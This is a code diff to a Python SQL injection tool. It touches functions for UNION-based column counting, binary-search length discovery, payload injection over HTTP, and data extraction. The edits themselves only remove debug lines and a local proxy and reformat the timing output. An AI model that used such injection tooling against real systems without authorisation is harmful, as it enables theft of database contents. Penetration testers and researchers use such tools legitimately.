@@ -410,8 +410,6 @@ def column_count(request_info, db_info, constants, args):
     utilizes UNION SELECT statements and NULL values to match the column output of the original sql query.
     """
 
-    #return 2
-
     print("[*] Attempting to count columns...")
 
     # Step 1: Baseline request
@@ -667,8 +665,6 @@ def discover_length(request_info, db_info, args):
     determines the length of the data using binary search.
     returns the length of the data if found, otherwise None.
     """
-
-    #return 17
 
     if not db_info.length_query or db_info.length_query == "N/A":
         print(f"[-] Length query not found for {db_info.db_name}. Skipping data length detection.")
@@ -1216,16 +1212,11 @@ def inject(payload, request_info, args):
             else:
                 params = None
 
-            proxies = {
-                'http': 'http://localhost:8080',
-                'https': 'http://localhost:8080',
-            }
-
             if args.data:
                 data = args.data.replace("INJECT", payload.encoded)
-                response = requests.post(url=url, headers=headers, data=data, timeout=args.timeout, proxies=proxies)
+                response = requests.post(url=url, headers=headers, data=data, timeout=args.timeout)
             else:
-                response = requests.get(url=url, headers=headers, params=params, timeout=args.timeout, proxies=proxies)
+                response = requests.get(url=url, headers=headers, params=params, timeout=args.timeout)
 
         end_time = time.time()
         response_time = end_time - start_time
@@ -1662,6 +1653,8 @@ def main():
         grams=grams
     )
 
+    start = time.time()
+
     if args.force:
         if args.force == "keyword":
             db_info.method = "keyword"
@@ -1738,11 +1731,8 @@ def main():
             return
 
     # Step 5: Extract the data
-    start = time.time()
     extracted_data = extract_data(request_info=request_info, db_info=db_info, constants=constants, args=args)
-    end = time.time()
-    time_taken = end - start
-    print(f"[*] Time taken: {time_taken}")
+
     # Step 6: Output the data
     if args.output_file:
         try:
@@ -1754,6 +1744,21 @@ def main():
             print(f"Extracted data: {extracted_data}")
     else:
         print(f"Extracted data: {extracted_data}")
+
+    end = time.time()
+    time_taken = end - start
+    hours = int(time_taken // 3600)
+    minutes = int((time_taken % 3600) // 60)
+    seconds = time_taken % 60
+    time_components = []
+    if hours:
+        time_components.append(f"{hours} hour{'s' if hours != 1 else ''}")
+    if minutes:
+        time_components.append(f"{minutes} minute{'s' if minutes != 1 else ''}")
+    if seconds or not time_components:
+        time_components.append(f"{seconds:.2f} second{'s' if seconds != 1 else ''}")
+    formatted_time = ', '.join(time_components)
+    print(f"Time taken: {formatted_time}")
 
 if __name__ == "__main__":
     main()
